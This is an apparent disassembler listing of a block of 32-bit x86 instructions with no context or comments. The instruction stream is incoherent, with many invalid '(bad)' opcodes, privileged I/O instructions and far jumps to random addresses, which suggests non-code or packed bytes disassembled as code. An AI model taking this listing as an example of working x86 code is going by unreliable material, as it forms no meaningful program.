  412e67:	sub    al,0x36
  412e69:	leave  
  412e6a:	add    DWORD PTR [edx],ebx
  412e6c:	and    DWORD PTR [ecx+0x18e10e4a],ecx
  412e72:	push   0x5111eaac
  412e77:	inc    edx
  412e78:	push   0x48
  412e7a:	xor    eax,0xa8aaeca4
  412e7f:	push   edx
  412e80:	pop    ebx
  412e81:	addr16 (bad) 
  412e84:	mov    dh,BYTE PTR [edx+0x4ff019ee]
  412e8a:	into   
  412e8b:	pop    ss
  412e8c:	sbb    BYTE PTR [edi+0x49],0x10
  412e90:	pop    es
  412e91:	jecxz  0x412e8c
  412e93:	pop    ds
  412e94:	jle    0x412e20
  412e96:	push   ss
  412e97:	sub    DWORD PTR [edx-0x2a],0x9abd1821
  412e9e:	inc    eax
  412e9f:	xor    dl,BYTE PTR [esi+ebp*1]
  412ea2:	push   esi
  412ea3:	xor    eax,0x6300a7f4
  412ea8:	(bad)  
  412ea9:	mov    dh,0x2e
  412eab:	(bad)  
  412ead:	push   ebx
  412eae:	mov    WORD PTR [edi-0x18],gs
  412eb1:	fs sbb al,0x63
  412eb4:	add    ch,BYTE PTR [ebx]
  412eb6:	(bad)  
  412eb8:	int3   
  412eb9:	rol    DWORD PTR [esi+0x30ef508e],1
  412ebf:	dec    esp
  412ec0:	xchg   edx,eax
  412ec1:	mov    ah,0x5
  412ec3:	sub    al,0x56
  412ec5:	aad    0xb4
  412ec7:	push   edi
  412ec8:	cdq    
  412ec9:	(bad)  [eax+0x138d312f]
  412ecf:	lahf   
  412ed0:	adc    al,cl
  412ed2:	scas   al,BYTE PTR es:[edi]
  412ed3:	and    bl,BYTE PTR [eax]
  412ed5:	add    esp,0x47
  412ed8:	test   DWORD PTR [ecx-0x5bd698b7],ebx
  412ede:	retf   0xe33f
  412ee1:	stos   DWORD PTR es:[edi],eax
  412ee2:	mov    edx,0x3072364b
  412ee7:	push   ebp
  412ee8:	cld    
  412ee9:	cmc    
  412eea:	mov    bl,0x24
  412eec:	push   0xffffffe5
  412eee:	arpl   WORD PTR [edi],dx
  412ef0:	fadd   DWORD PTR [edx-0x31]
  412ef3:	mov    edx,0xbff93c50
  412ef8:	daa    
  412ef9:	push   ebx
  412efa:	hlt    
  412efb:	mov    DWORD PTR [esi-0x3a],edx
  412efe:	aam    0x23
  412f00:	sar    BYTE PTR [edi+ecx*4-0x74],cl
  412f04:	cld    
  412f05:	and    DWORD PTR [eax-0x6f],esi
  412f08:	or     eax,0xb3579c38
  412f0d:	jmp    0x723b:0x3904b8d6
  412f14:	sub    DWORD PTR [edi+0x53c9150b],ecx
  412f1a:	cmc    
  412f1b:	lock pop esp
  412f1d:	loope  0x412ed7
  412f1f:	add    BYTE PTR [esi+0x6b],cl
  412f22:	inc    esi
  412f23:	mov    eax,ds:0x2364d132
  412f28:	xchg   esi,eax
  412f29:	push   edx
  412f2a:	or     esi,edi
  412f2c:	ret    0x4ced
  412f2f:	das    
  412f30:	dec    ebx
  412f31:	dec    DWORD PTR [edi-0x7f]
  412f34:	ret    
  412f35:	aaa    
  412f36:	sbb    al,0x3d
  412f38:	aaa    
  412f39:	jo     0x412f01
  412f3b:	mov    ebp,0x8f0d3998
  412f40:	jecxz  0x412f41
  412f42:	int3   
  412f43:	add    al,0x62
  412f45:	push   es
  412f46:	fwait
  412f47:	scas   eax,DWORD PTR es:[edi]
  412f48:	sbb    BYTE PTR [esi],bh
  412f4a:	setge  BYTE PTR [edi+ebp*2-0x71753e1a]
  412f52:	and    al,0xa2
  412f54:	je     0x412f35
  412f56:	inc    esp
  412f57:	addr16 inc ecx
  412f59:	sub    BYTE PTR [ebx-0x21],al
  412f5c:	pop    eax
  412f5d:	push   ss
  412f5e:	pop    ss
  412f5f:	adc    eax,DWORD PTR [eax]
  412f61:	ds add eax,0x79c6c60a
  412f67:	retf   0x1047
  412f6a:	mov    ch,0x98
  412f6c:	pop    eax
  412f6d:	inc    ebx
  412f6e:	push   0x26
  412f70:	scas   al,BYTE PTR es:[edi]
  412f71:	cmp    dl,BYTE PTR [eax]
  412f73:	sbb    DWORD PTR [ebx],esp
  412f75:	push   ebp
  412f76:	mov    ?,ecx
  412f78:	dec    edi
  412f79:	xor    al,0xf8
  412f7b:	fld    st(7)
  412f7d:	into   
  412f7e:	or     eax,0x30249eeb
  412f83:	mov    DWORD PTR [esi+0x6e7d6c79],eax
  412f89:	pop    ecx
  412f8a:	mov    dh,0xda
  412f8c:	test   edi,0xe1bf7efd
  412f92:	std    
  412f93:	pop    edi
  412f94:	xchg   esi,eax
  412f95:	mov    edi,0xe24cb23c
  412f9a:	jge    0x412f83
  412f9c:	imul   edi,ebp,0x20fd64c9
  412fa2:	jl     0x412f54
  412fa4:	setne  ch
  412fa7:	xchg   DWORD PTR [edx],eax
  412fa9:	aas    
  412faa:	mov    ch,0x5b
  412fac:	shl    BYTE PTR [ebx-0x13c61f39],0x51
  412fb3:	dec    esp
  412fb4:	xchg   esi,eax
  412fb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fb6:	jnp    0x412f73
  412fb8:	test   BYTE PTR [ecx-0x17f64616],0xdb
  412fbf:	ret    
  412fc0:	jg     0x412fc5
  412fc2:	test   BYTE PTR [ebx-0x62],al
  412fc5:	xchg   edi,eax
  412fc6:	fisttp QWORD PTR [esi-0x1f]
  412fc9:	mov    ds,WORD PTR [esi+0x56]
  412fcc:	data16 jbe 0x412fc7
  412fcf:	mov    esi,0xdd667957
  412fd4:	test   eax,0x76896712
  412fd9:	inc    edx
  412fda:	dec    edi
  412fdb:	rcr    ebx,cl
  412fdd:	jbe    0x412fda
  412fdf:	daa    
  412fe0:	out    dx,eax
  412fe1:	jo     0x412f91
  412fe3:	mov    ah,0x6f
  412fe5:	cli    
  412fe6:	or     DWORD PTR [ebx+ebp*2],edx
  412fe9:	cmp    dl,BYTE PTR [edi]
  412feb:	loop   0x412fde
  412fed:	icebp  
  412fee:	daa    
  412fef:	sbb    eax,0x586dd970
  412ff4:	and    al,0x36
  412ff6:	rol    BYTE PTR [ebp+0x564fa43a],1
  412ffc:	xchg   ebp,eax
  412ffd:	in     eax,dx
  412ffe:	and    bl,BYTE PTR [ebx-0x2da2c59e]
  413004:	in     al,dx
  413005:	jae    0x412f91
  413007:	and    BYTE PTR [ebx-0x27],bh
  41300a:	push   ecx
  41300b:	cdq    
  41300c:	sub    eax,0x79dd8c07
  413011:	push   0xcedbfc6d
  413016:	inc    DWORD PTR [eax+0x24]
  413019:	cli    
  41301a:	cmp    BYTE PTR [ebx-0x2],cl
  41301d:	cmp    BYTE PTR [edx-0x2c3e946c],0xb3
  413024:	stos   DWORD PTR es:[edi],eax
  413025:	(bad)  
  413026:	sbb    al,0x81
  413028:	or     edx,ebp
  41302a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41302b:	push   esi
  41302c:	push   cs
  41302d:	mov    bh,0x81
  41302f:	mov    ecx,0x96baa4f
  413034:	fcomp  QWORD PTR [edx-0x11fec1ef]
  41303a:	sbb    BYTE PTR [ecx+ecx*2+0x3],dl
  41303e:	xchg   ecx,eax
  41303f:	and    eax,0x80e331aa
  413044:	or     BYTE PTR [ebp-0x6d77f16c],bl
  41304a:	and    al,BYTE PTR [ecx+esi*2+0x5cdadbb4]
  413051:	pop    edi
  413052:	out    dx,al
  413053:	mov    dh,0xd8
  413055:	push   0x71
  413057:	add    bl,BYTE PTR [esp+eiz*8-0x275db875]
  41305e:	sbb    ah,dl
  413060:	mov    edx,0xcb31ff42
  413065:	(bad)  
  413066:	sti    
  413067:	cmp    esi,DWORD PTR [ebx-0xa41343d]
  41306d:	xchg   esp,eax
  41306e:	and    eax,0x57fd7c13
  413073:	(bad)
  413076:	jl     0x413053
  413078:	push   esp
  413079:	call   0x9493c3a0
  41307e:	call   0xb600:0x1c9f805e
  413085:	sub    al,0xc7
  413087:	not    DWORD PTR [ebx+edx*8+0x165de466]
  41308e:	dec    edx
  41308f:	sar    ebx,1
  413091:	addr16 adc eax,0xf53908af
  413097:	shl    BYTE PTR [ecx],0x8
  41309a:	mov    al,0x72
  41309c:	fnstsw WORD PTR ds:0x823dc3ae
  4130a2:	neg    DWORD PTR [esi-0x6a]
  4130a5:	in     al,0x6e
  4130a7:	iret   
  4130a8:	mov    ebx,DWORD PTR [ebx+esi*4-0x2a85ced2]
  4130af:	pop    esi
  4130b0:	push   esi
  4130b1:	mov    dl,0x23
  4130b3:	das    
  4130b4:	mov    ds:0x94a8af2a,al
  4130b9:	imul   ebx,DWORD PTR ds:0x7deb38ac,0xffffffb4
  4130c0:	and    edi,ebx
  4130c2:	jne    0x41306e
  4130c4:	pop    ds
  4130c5:	imul   edi,eax,0xa081bf5b
  4130cb:	clc    
  4130cc:	adc    DWORD PTR [eax-0x6d3893f9],esp
  4130d2:	pop    esp
  4130d3:	push   0xe04aed42
  4130d8:	mov    eax,edi
  4130da:	mov    ds:0xb0fe6e04,al
  4130df:	xchg   esi,eax
  4130e0:	(bad)  
  4130e1:	or     eax,0x6948510d
  4130e6:	inc    ebx
  4130e7:	(bad)  
  4130e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130ea:	retf   0x9143
  4130ed:	loop   0x4130a7
  4130ef:	icebp  
  4130f0:	sar    DWORD PTR [edx],cl
  4130f2:	dec    ecx
  4130f3:	inc    ecx
  4130f4:	mov    ch,0x77
  4130f6:	hlt    
  4130f7:	mov    esi,0xd03e0a9b
  4130fc:	stos   BYTE PTR es:[edi],al
  4130fd:	jne    0x41311c
  4130ff:	mov    dh,BYTE PTR [ebx-0xf9d188c]
  413105:	mov    WORD PTR [ecx],fs
  413107:	xor    al,0x57
  413109:	in     al,dx
  41310a:	xor    eax,0x8008a936
  41310f:	shl    BYTE PTR [edi],1
  413111:	call   0xbfca93ab
  413116:	and    eax,0xf5f6960a
  41311b:	mov    bl,0x42
  41311d:	mov    ebx,0x987dbac3
  413122:	daa    
  413123:	rcr    BYTE PTR [edx],0x20
  413126:	dec    ecx
  413127:	pop    ds
  413128:	and    eax,0x97f5d78c
  41312d:	push   edx
  41312e:	push   ecx
  41312f:	icebp  
  413130:	mov    BYTE PTR [edi+0x5664f62b],0x7b
  413137:	jecxz  0x413134
  413139:	(bad)  
  41313a:	or     eax,0x432f70c
  41313f:	adc    bl,BYTE PTR [edx]
  413141:	aam    0x5e
  413143:	mov    al,ds:0x6f52cc87
  413148:	jecxz  0x41314c
  41314a:	mov    ds,WORD PTR [esi]
  41314c:	add    al,0x69
  41314e:	repnz (bad) 
  413151:	mov    bh,0x67
  413153:	aad    0x26
  413155:	(bad)  
  413156:	jecxz  0x41318b
  413158:	mov    ds:0x93df2ada,al
  41315d:	nop
  41315e:	test   eax,0x50f09752
  413163:	pop    ecx
  413164:	push   cs
  413165:	sub    dh,bh
  413167:	dec    ebp
  413168:	jp     0x413183
  41316a:	test   edx,0x332f33dd
  413170:	cmp    al,0x6d
  413172:	push   ds
  413173:	stc    
  413174:	rcr    DWORD PTR [esi-0x73],1
  413177:	cmp    DWORD PTR [eax+esi*8+0x408965c4],edi
  41317e:	cmp    DWORD PTR [ecx+0x3d],ebp
  413181:	mov    ebx,0x43c7453d
  413186:	mov    ds:0xd6de7757,al
  41318b:	adc    DWORD PTR [ecx],ebx
  41318d:	out    dx,eax
  41318e:	popf   
  41318f:	mov    esi,0xd231aa06
  413194:	jmp    DWORD PTR [eax-0x2a]
  413197:	retf   0xf760
  41319a:	inc    esp
  41319b:	cwde   
  41319c:	xchg   edx,eax
  41319d:	mov    ds:0x505dfae4,eax
  4131a2:	inc    esp
  4131a3:	xor    BYTE PTR [edx-0x60],bh
  4131a6:	imul   esi,DWORD PTR [esi],0xffffffa7
  4131a9:	cmp    ecx,0x150577f5
  4131af:	xchg   esp,eax
  4131b0:	mov    ds,WORD PTR [eax]
  4131b2:	ins    BYTE PTR es:[edi],dx
  4131b3:	into   
  4131b4:	out    0xfc,eax
  4131b6:	or     cl,dh
  4131b8:	pop    ds
  4131b9:	dec    ebp
  4131ba:	paddsw mm6,QWORD PTR [ebp-0x14c4769c]
  4131c1:	cmp    DWORD PTR [edi+0x4aa3beeb],esp
  4131c7:	popf   
  4131c8:	out    dx,eax
  4131c9:	pop    ebp
  4131ca:	ss sbb al,0x37
  4131cd:	mov    sp,WORD PTR [edx]
  4131d0:	icebp  
  4131d1:	pop    esi
  4131d2:	cmp    al,0xcf
  4131d4:	push   cs
  4131d5:	test   esi,esp
  4131d7:	bound  esp,QWORD PTR [edi]
  4131d9:	cwde   
  4131da:	lods   eax,DWORD PTR ds:[esi]
  4131db:	loopne 0x41322d
  4131dd:	stos   BYTE PTR es:[edi],al
  4131de:	dec    edx
  4131df:	shl    BYTE PTR [ebp+ebx*1-0x197111d9],1
  4131e6:	test   ch,dl
  4131e8:	dec    ebx
  4131e9:	and    eax,0xae07baef
  4131ee:	pop    esp
  4131ef:	or     al,BYTE PTR [edi+0x41]
  4131f2:	je     0x4131e4
  4131f4:	mov    dh,BYTE PTR ds:0xc7304fa3
  4131fa:	mov    al,BYTE PTR [ebp+0x56]
  4131fd:	nop
  4131fe:	and    ebx,DWORD PTR [ecx-0x47144ac2]
  413204:	pop    eax
  413205:	sbb    eax,0x9d9370e0
  41320a:	repz std 
  41320c:	mov    al,ds:0xc8ffc44a
  413211:	mov    bh,0xdb
  413213:	xor    eax,0x5d2f0731
  413218:	popa   
  413219:	mov    al,ds:0x634127d4
  41321e:	popa   
  41321f:	add    DWORD PTR [eax],0x7b
  413222:	pop    ecx
  413223:	popa   
  413224:	xor    BYTE PTR [eax-0x19afbd0c],ch
  41322a:	xchg   esp,eax
  41322b:	jmp    0x8c79:0x9794e31b
  413232:	mov    edx,0xaab72ab7
  413237:	mov    ch,0xbe
  413239:	push   esi
  41323a:	sar    ebx,1
  41323c:	cmp    BYTE PTR [edx+0x41],ch
  41323f:	out    0x55,al
  413241:	dec    esp
  413242:	pop    ebp
  413243:	test   DWORD PTR [ebx-0x5e],esi
  413246:	outs   dx,DWORD PTR ds:[esi]
  413247:	popf   
  413248:	mov    esi,DWORD PTR [ebp+0x1e]
  41324b:	fsub   st,st(0)
  41324d:	retf   0xc35d
  413250:	mov    ds:0x781f829e,al
  413255:	stos   DWORD PTR es:[edi],eax
  413256:	jmp    0xd95d820e
  41325b:	mov    ecx,DWORD PTR [ebp+0x22]
  41325e:	sbb    DWORD PTR [eax],0xfffffff3
  413261:	adc    edx,ebp
  413263:	mov    ds:0x6d46b62d,al
  413268:	mov    BYTE PTR [ebx],ah
  41326a:	(bad)  
  41326b:	shr    BYTE PTR [eax+0xd],cl
  41326e:	ss js  0x4132a3
  413271:	mov    ebp,DWORD PTR [eax+esi*4]
  413274:	in     eax,0xa3
  413276:	(bad)  
  413277:	mov    dl,0x44
  413279:	div    DWORD PTR gs:[bp+di]
  41327d:	push   edi
  41327e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41327f:	ret    
  413280:	jns    0x413248
  413282:	add    bl,al
  413284:	cmp    al,BYTE PTR [esi+0x408e1de2]
  41328a:	mov    ds:0x9ed6acb6,eax
  41328f:	and    DWORD PTR [eax-0x5],0xe11cc134
  413296:	in     al,dx
  413297:	xor    al,0xc1
  413299:	sbb    DWORD PTR [ebx-0x2012169d],ebx
  41329f:	pop    edi
  4132a0:	jnp    0x41325b
  4132a2:	sahf   
  4132a3:	mov    ebp,0xa2d2c2fe
  4132a8:	dec    eax
  4132a9:	push   esi
  4132aa:	pop    esp
  4132ab:	bound  ebx,QWORD PTR [eax-0x3b]
  4132ae:	stos   DWORD PTR es:[edi],eax
  4132af:	xchg   edx,eax
  4132b0:	call   0x7d72:0x5ffb105c
  4132b7:	loop   0x4132ed
  4132b9:	xchg   DWORD PTR [edi],eax
  4132bb:	xchg   edi,eax
  4132bc:	dec    esi
  4132bd:	sub    al,0xf8
  4132bf:	cmp    bh,BYTE PTR [eax-0x40e143c6]
  4132c5:	mov    bl,0xdd
  4132c7:	add    al,BYTE PTR [ecx]
  4132c9:	xchg   ebp,eax
  4132ca:	sbb    eax,0xdf2e645
  4132cf:	push   es
  4132d0:	hlt    
  4132d1:	mov    cl,0x2e
  4132d3:	push   esp
  4132d4:	call   0x5d9:0x397ff57
  4132db:	pop    ebp
  4132dc:	in     eax,dx
  4132dd:	or     DWORD PTR [eax+0x713cb39f],ebx
  4132e3:	xchg   edi,eax
  4132e4:	imul   ecx,esp,0xffffffe6
  4132e7:	stc    
  4132e8:	jb     0x413359
  4132ea:	jno    0x41330a
  4132ec:	mov    al,ds:0x5552d97c
  4132f1:	jecxz  0x413320
  4132f3:	(bad)  
  4132f4:	cwde   
  4132f5:	fidivr DWORD PTR [ebx+0x59]
  4132f8:	mov    cl,0xc
  4132fa:	retf   0x4951
  4132fd:	inc    ebp
  4132fe:	loopne 0x413333
  413300:	je     0x413381
  413302:	sbb    edi,ebx
  413304:	pcmpeqw mm4,QWORD PTR [ebp+ebp*4-0x29a7827d]
  41330c:	lahf   
  41330d:	cmp    edx,edx
  41330f:	cmp    eax,0xb8b223dd
  413314:	push   eax
  413315:	stc    
  413316:	arpl   WORD PTR [esi],ax
  413318:	pop    ds
  413319:	inc    edx
  41331a:	call   0x227d911
  41331f:	jno    0x413378
  413321:	mov    ?,WORD PTR [ecx+0x4e]
  413324:	ins    BYTE PTR es:[edi],dx
  413325:	sti    
  413326:	add    ebx,eax
  413328:	call   0xdd22:0x915bf0fe
  41332f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413330:	(bad)  
  413331:	mov    ecx,0x57fd15de
  413336:	cmp    BYTE PTR [ecx+esi*2],bh
  413339:	ret    
  41333a:	dec    ebp
  41333b:	int3   
  41333c:	adc    bh,BYTE PTR [ebx-0x45dadcd9]
  413342:	data16 xor ch,BYTE PTR [edi+0x44f456ca]
  413349:	dec    esi
  41334a:	lds    edi,FWORD PTR ds:0x802bf3f9
  413350:	add    esi,DWORD PTR [ecx-0x45d6742a]
  413356:	jo     0x413301
  413358:	std    
  413359:	repz cld 
  41335b:	mov    cl,0x97
  41335d:	jl     0x41334e
  41335f:	inc    edi
  413360:	pusha  
  413361:	inc    ebx
  413362:	jae    0x4132e4
  413364:	out    0x7b,al
  413366:	ret    
  413367:	sbb    BYTE PTR [edx-0x162287f1],dh
  41336d:	adc    ebp,DWORD PTR [eax]
  41336f:	ins    BYTE PTR es:[edi],dx
  413370:	out    dx,eax
  413371:	fimul  WORD PTR [edx-0x35]
  413374:	sbb    DWORD PTR es:[ecx+edi*4],ebx
  413378:	cmp    al,0xe8
  41337a:	les    eax,FWORD PTR [edi-0x79316ae7]
  413380:	aam    0x3f
  413382:	data16 (bad) 
  413384:	push   eax
  413385:	mov    BYTE PTR [ebp-0x6e],ch
  413388:	inc    ecx
  413389:	sub    eax,0xfe72a850
  41338e:	xchg   ebp,eax
  41338f:	push   edx
  413390:	loopne 0x4133d4
  413392:	cli    
  413393:	in     al,0xb2
  413395:	pop    es
  413396:	(bad)  
  413397:	adc    edx,esi
  413399:	gs out dx,eax
  41339b:	mov    eax,DWORD PTR [ebx+0x5723c370]
  4133a1:	shl    DWORD PTR [ecx-0x4050d02a],1
  4133a7:	stos   DWORD PTR es:[edi],eax
  4133a8:	stos   BYTE PTR es:[edi],al
  4133a9:	loop   0x413405
  4133ab:	jmp    0x6c6:0xdaac8d92
  4133b2:	pop    es
  4133b3:	sub    di,WORD PTR [esi-0x11]
  4133b7:	sbb    BYTE PTR [ebx+0x5db2454c],cl
  4133bd:	cwde   
  4133be:	push   ds
  4133bf:	push   edx
  4133c0:	and    cl,BYTE PTR [eax-0x7b962bd7]
  4133c6:	cmc    
  4133c7:	sbb    ebp,ebx
  4133c9:	inc    esi
  4133ca:	cmp    DWORD PTR [edi+0x4ac9190f],ebp
  4133d0:	and    DWORD PTR [ebx+0x3bdfd69d],ebx
  4133d6:	ret    0xbef7
  4133d9:	int    0xed
  4133db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133dc:	push   eax
  4133dd:	imul   esp,edi,0x72985961
  4133e3:	inc    ecx
  4133e4:	inc    ebp
  4133e5:	addr16 and al,0x85
  4133e8:	inc    edi
  4133ea:	fiadd  WORD PTR [ebx+0x4a]
  4133ed:	das    
  4133ee:	cdq    
  4133ef:	sub    esi,DWORD PTR [edx+ecx*8-0x7a1b499]
  4133f6:	dec    eax
  4133f7:	repnz xor dh,BYTE PTR [ecx-0x7a]
  4133fb:	fidiv  WORD PTR [esi-0x1]
  4133fe:	mov    bl,0x88
  413400:	iret   
  413401:	stos   BYTE PTR es:[edi],al
  413402:	rsm    
  413404:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413405:	and    cl,BYTE PTR [edx+0x11]
  413408:	xchg   ebx,eax
  413409:	dec    esi
  41340a:	xlat   BYTE PTR ds:[ebx]
  41340b:	adc    edx,edx
  41340d:	(bad)  
  41340e:	jmp    0x3e45:0xd34c2138
  413415:	xchg   edi,eax
  413416:	jno    0x4133e5
  413418:	push   ds
  413419:	je     0x413410
  41341b:	pop    es
  41341c:	sub    DWORD PTR [eax+0x47],esi
  41341f:	pop    ecx
  413420:	mov    bh,0x96
  413422:	lea    eax,[ebx+edx*4+0x78215123]
  413429:	mov    bl,0xea
  41342b:	out    0x5a,al
  41342d:	shr    BYTE PTR [ebx-0x59aa1643],0x6d
  413434:	mov    esp,DWORD PTR [edi]
  413436:	xor    ah,BYTE PTR [eax+0x7d06259d]
  41343c:	push   cs
  41343d:	and    eax,0xc04bc892
  413442:	adc    esp,edx
  413444:	aas    
  413445:	jae    0x413483
  413447:	mov    ds:0x412e92e1,eax
  41344c:	and    edx,esi
  41344e:	shl    BYTE PTR [edi+0x39a584e0],0xb7
  413455:	outs   dx,BYTE PTR ds:[esi]
  413456:	enter  0x2ea5,0x50
  41345a:	out    dx,al
  41345b:	in     eax,0x9f
  41345d:	(bad)  
  41345e:	push   0xfffffff2
  413460:	dec    eax
  413461:	pop    eax
  413462:	sub    ecx,ebp
  413464:	mov    ds:0x45af88e7,eax
  413469:	(bad)  
  41346a:	mov    cl,0xa9
  41346c:	fdivr  DWORD PTR [ebx+0x37]
  41346f:	pop    esp
  413470:	sub    esi,DWORD PTR [ecx+0x1d]
  413473:	jae    0x4133f6
  413475:	and    ebx,ebp
  413477:	rol    ch,cl
  413479:	dec    ecx
  41347a:	pop    ecx
  41347b:	ja     0x4134d8
  41347d:	dec    eax
  41347e:	in     al,0xb9
  413480:	xor    bh,BYTE PTR [edi]
  413482:	call   0x2065:0x3672029a
  413489:	sub    dh,bh
  41348b:	cld    
  41348c:	jp     0x413504
  41348e:	pop    eax
  41348f:	cmp    al,0x52
  413491:	sub    eax,0x88bc5cd5
  413496:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413497:	fst    st(4)
  413499:	dec    ebp
  41349a:	je     0x4134cc
  41349c:	out    0xfb,al
  41349e:	fldcw  WORD PTR [eax+ecx*8-0x2f65f71f]
  4134a5:	dec    ebp
  4134a6:	(bad)  
  4134a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134a8:	mov    ebx,0xdf425cf7
  4134ad:	add    ecx,ecx
  4134af:	push   ss
  4134b0:	iret   
  4134b1:	mov    ah,0x5d
  4134b3:	sti    
  4134b4:	lods   al,BYTE PTR ds:[esi]
  4134b5:	inc    eax
  4134b6:	push   0xffffffa5
  4134b8:	cli    
  4134b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134bb:	das    
  4134bc:	mov    edi,0x584a9e0e
  4134c1:	jecxz  0x41353c
  4134c3:	into   
  4134c4:	leave  
  4134c5:	sub    esp,DWORD PTR [ebx-0xdb2ecac]
  4134cb:	lds    edx,FWORD PTR [esi-0x6d403eb9]
  4134d1:	std    
  4134d2:	sub    ecx,edi
  4134d4:	ror    edi,cl
  4134d6:	fwait
  4134d7:	mov    bh,dh
  4134d9:	mov    edx,0xada6188a
  4134de:	ror    DWORD PTR [ebx+0x6],0xa9
  4134e2:	mov    edi,0x210d3b73
  4134e7:	mov    ebx,0x6eacf898
  4134ec:	cdq    
  4134ed:	xchg   BYTE PTR [ecx],ch
  4134ef:	mov    al,0x2d
  4134f1:	(bad)  
  4134f2:	and    BYTE PTR [edx+0x18],dh
  4134f5:	push   0xffffff94
  4134f7:	mov    al,ds:0x9569f1f0
  4134fc:	addr16 sbb edx,edx
  4134ff:	lahf   
  413500:	test   eax,0xdb271abe
  413505:	xchg   edi,eax
  413506:	add    eax,0x6f32e12c
  41350b:	js     0x41353a
  41350d:	sbb    al,0x6d
  41350f:	lods   al,BYTE PTR ds:[esi]
  413510:	je     0x413499
  413512:	cdq    
  413513:	test   BYTE PTR [ebp+0x4],al
  413516:	sub    al,0x1d
  413518:	jle    0x4134b7
  41351a:	fistp  WORD PTR ds:0x326afe63
  413520:	iret   
  413521:	xor    cl,BYTE PTR [eax+0x2c]
  413524:	jno    0x413573
  413526:	shl    DWORD PTR [ebx-0x22],cl
  413529:	in     al,0x19
  41352b:	stos   BYTE PTR es:[edi],al
  41352c:	jl     0x41355a
  41352e:	outs   dx,BYTE PTR ds:[esi]
  41352f:	pop    es
  413530:	sti    
  413531:	xor    eax,0xc8ded3d6
  413536:	mul    BYTE PTR [edx-0x49]
  413539:	xor    al,0x7f
  41353b:	xchg   BYTE PTR [ecx],cl
  41353d:	lea    edi,[ebx]
  41353f:	or     DWORD PTR [eax],ebx
  413541:	or     BYTE PTR [eax+0x5b],al
  413544:	outs   dx,DWORD PTR ds:[esi]
  413545:	stos   BYTE PTR es:[edi],al
  413546:	xor    eax,0xde1dc8c7
  41354b:	pop    edx
  41354c:	je     0x41352f
  41354e:	pop    eax
  41354f:	xchg   bl,dl
  413551:	lea    ebp,[ecx]
  413553:	repz adc DWORD PTR [ebp-0x4a],edx
  413557:	dec    esp
  413558:	jecxz  0x4134fc
  41355a:	xor    edx,ebx
  41355c:	test   edx,esp
  41355e:	shl    BYTE PTR [ebx+edi*1-0x44e0e17c],1
  413565:	repz mov gs,WORD PTR [ebx]
  413568:	inc    esi
  413569:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41356a:	fwait
  41356b:	scas   al,BYTE PTR es:[edi]
  41356c:	clc    
  41356d:	clc    
  41356e:	inc    ebx
  41356f:	jecxz  0x4135cd
  413571:	inc    eax
  413572:	std    
  413573:	and    DWORD PTR [edx],0x62
  413576:	hlt    
  413577:	int    0xa3
  413579:	pushf  
  41357a:	popf   
  41357b:	add    dh,BYTE PTR [edx-0x7]
  41357e:	sub    eax,0x45c6eb7d
  413583:	jmp    0xb7d0453d
  413588:	and    esp,DWORD PTR [ebp-0x26b94635]
  41358e:	(bad)
  413593:	in     eax,dx
  413594:	pusha  
  413595:	sub    bh,dl
  413597:	in     al,0x5f
  413599:	xor    bh,bl
  41359b:	sbb    BYTE PTR [ecx+edx*2-0x6cdd187a],dh
  4135a2:	test   BYTE PTR [eax],ch
  4135a4:	dec    ebx
  4135a5:	push   es
  4135a6:	jl     0x413535
  4135a8:	add    eax,0xf52fe578
  4135ad:	call   0x2bcec550
  4135b2:	xchg   edi,eax
  4135b3:	fisttp DWORD PTR [eax]
  4135b5:	dec    ebp
  4135b6:	xor    al,0x24
  4135b8:	bound  ebp,QWORD PTR [eax]
  4135ba:	jle    0x4135ef
  4135bc:	test   al,0xa0
  4135be:	mov    esi,0x5da261e8
  4135c3:	mov    ecx,0x97d07689
  4135c8:	cmp    esi,esi
  4135ca:	xchg   esi,eax
  4135cb:	adc    DWORD PTR [edi+esi*4],esi
  4135ce:	mov    bl,0x3a
  4135d0:	sbb    DWORD PTR [esi],esp
  4135d2:	push   cs
  4135d3:	mov    dl,ah
  4135d5:	mov    bh,0x27
  4135d7:	inc    esi
  4135d8:	les    edx,FWORD PTR [eax+0x38]
  4135db:	into   
  4135dc:	push   0x6
  4135de:	data16 lahf 
  4135e0:	lea    ebx,[esp]
  4135e3:	adc    dh,bh
  4135e5:	cmp    al,0x88
  4135e7:	dec    edx
  4135e8:	jnp    0x413634
  4135ea:	icebp  
  4135eb:	push   ebp
  4135ec:	dec    edi
  4135ed:	sbb    BYTE PTR [esi],dh
  4135ef:	push   esi
  4135f0:	fimul  WORD PTR [edi]
  4135f2:	dec    ebx
  4135f3:	cmp    eax,0x6440cd67
  4135f8:	mov    eax,0xf54dd62b
  4135fd:	mov    esp,DWORD PTR [edx]
  4135ff:	and    edi,esi
  413601:	jnp    0x41367d
  413603:	inc    eax
  413604:	push   ebx
  413605:	inc    esi
  413606:	fstp   TBYTE PTR [edi+eiz*4-0x4d]
  41360a:	and    ah,BYTE PTR [esi-0x6]
  41360d:	and    BYTE PTR [ebp+esi*2-0x47b264a6],bh
  413614:	dec    edi
  413615:	jl     0x41359d
  413617:	int    0x9c
  413619:	cmp    ebx,DWORD PTR [edx]
  41361b:	mov    dl,0x67
  41361d:	mov    ah,0x87
  41361f:	jns    0x413618
  413621:	mov    ds:0x1d8307cd,eax
  413626:	ror    bh,0x22
  413629:	dec    eax
  41362a:	pop    eax
  41362b:	dec    edi
  41362c:	cs test eax,0xf0ec08da
  413632:	stc    
  413633:	push   esi
  413634:	shld   ebx,esp,0xc4
  413638:	ss inc edx
  41363a:	ins    BYTE PTR es:[edi],dx
  41363b:	dec    edi
  41363c:	(bad)  
  41363d:	fsub   DWORD PTR [esi+0x16]
  413640:	xor    DWORD PTR [eax],ecx
  413642:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413643:	add    al,0x4d
  413645:	push   esi
  413646:	mov    dh,0xb5
  413648:	call   0xc3a5f5bc
